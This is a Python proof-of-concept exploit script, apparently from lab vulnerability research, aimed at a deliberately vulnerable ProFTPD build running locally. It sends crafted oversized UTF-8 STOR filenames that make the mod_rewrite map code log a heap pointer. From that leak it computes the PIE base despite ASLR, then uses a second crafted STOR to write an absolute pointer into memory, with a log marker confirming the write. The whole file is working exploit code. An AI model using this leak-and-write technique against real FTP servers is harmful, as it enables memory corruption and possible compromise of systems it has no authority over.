#!/usr/bin/env python3
"""Calibrate a leaked heap pointer, then plant an absolute pointer under ASLR-on.

Phase 1 (--setarch): one 1025-code-point STOR with byte 0xe8 makes
rewrite_parse_map_str log a heap pointer with %s. Its offset from the known
PIE base 0x555555554000 is printed.

Phase 2 (no flag): same leak, infer the live PIE base from LEAK_OFFSET, then a
1200-code-point STOR replaces all eight bytes of substr with base + 0xb94af
(the 'NOOP command successful' string). A RewriteLog marker proves an
ASLR-independent absolute pointer write.
"""
import io
import os
import re
import socket
import subprocess
import sys
import time
import ftplib

W = os.path.dirname(os.path.abspath(__file__))
CFG = W + "/etc/proftpd-leak.conf"
BIN = W + "/../proftpd-vuln-plain"
LOG = W + "/log/rewrite-leak.log"
PORT = 21904
LEAK_BYTE = 0xE8
TARGET_OFF = 0xB94AF
BASE_FIXED = 0x555555554000


def read_leak():
    data = open(LOG, "rb").read()
    cands = []
    for ln in data.split(b"\n"):
        m = re.search(rb"maps subst'd pattern: '([^']*)'", ln)
        if not m:
            continue
        v = m.group(1)
        if len(v) >= 6 and v[-3:] == b"\x55\x55\x55":
            cands.append(v[-6:])
    return cands


def main():
    calib = "--setarch" in sys.argv
    argv = [BIN, "-n", "-c", CFG]
    if calib:
        argv = ["setarch", "x86_64", "-R"] + argv
    open(LOG, "wb").close()
    srv = subprocess.Popen(argv, cwd=W, stdout=open(W + "/log/aslr-leak-server.out", "wb"),
                           stderr=subprocess.STDOUT)
    try:
        for _ in range(60):
            try:
                s = socket.create_connection(("127.0.0.1", PORT), 0.3)
                s.close()
                break
            except OSError:
                time.sleep(0.05)
        ftp = ftplib.FTP()
        ftp.encoding = "latin-1"
        ftp.connect("127.0.0.1", PORT, timeout=5)
        ftp.login("labuser", "labpass")
        ftp.set_pasv(True)
        leak_key = (chr(LEAK_BYTE) + "A" * 1024).encode("utf-8").decode("latin-1")
        try:
            ftp.storbinary("STOR " + leak_key, io.BytesIO(b"z" * 16))
        except Exception as exc:
            print("LEAK_STOR_ERR", type(exc).__name__, str(exc)[:80])
        time.sleep(0.2)
        leaks = read_leak()
        print("LEAKS", [x.hex() for x in leaks])
        if not leaks:
            print("NO_LEAK")
            return
        leaked = int.from_bytes(leaks[-1], "little")
        print("LEAKED", hex(leaked))
        if calib:
            print("OFFSET", hex(leaked - BASE_FIXED))
            return
        offset = int(os.environ.get("LEAK_OFFSET", "0"), 0)
        if not offset:
            print("SET_LEAK_OFFSET_FIRST")
            return
        base = leaked - offset
        target = base + TARGET_OFF
        print("BASE", hex(base), "TARGET", hex(target))
        tb = target.to_bytes(8, "little")
        cps = ["A"] * 1200
        for k in range(6):
            cps[8 * k] = chr(tb[k])
        cps[48] = "\u0100"
        cps[56] = "\u0100"
        key = "".join(cps).encode("utf-8").decode("latin-1")
        try:
            ftp.storbinary("STOR " + key, io.BytesIO(b"z" * 16))
            print("WRITE_STOR_OK")
        except Exception as exc:
            print("WRITE_STOR_ERR", type(exc).__name__, str(exc)[:80])
        for cmd in ("NOOP", "PWD"):
            try:
                print(cmd + "=" + str(ftp.voidcmd(cmd))[:100])
            except Exception as exc:
                print(cmd + "_FAIL", type(exc).__name__, str(exc)[:80])
        ftp.close()
        time.sleep(0.2)
        data = open(LOG, "rb").read()
        print("MARKER_COUNT", data.count(b"NOOP command successful"))
        for ln in data.split(b"\n"):
            if b"NOOP command successful" in ln:
                print("MARKER", repr(ln[:200]))
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=3)
        except subprocess.TimeoutExpired:
            srv.kill()


if __name__ == "__main__":
    main()
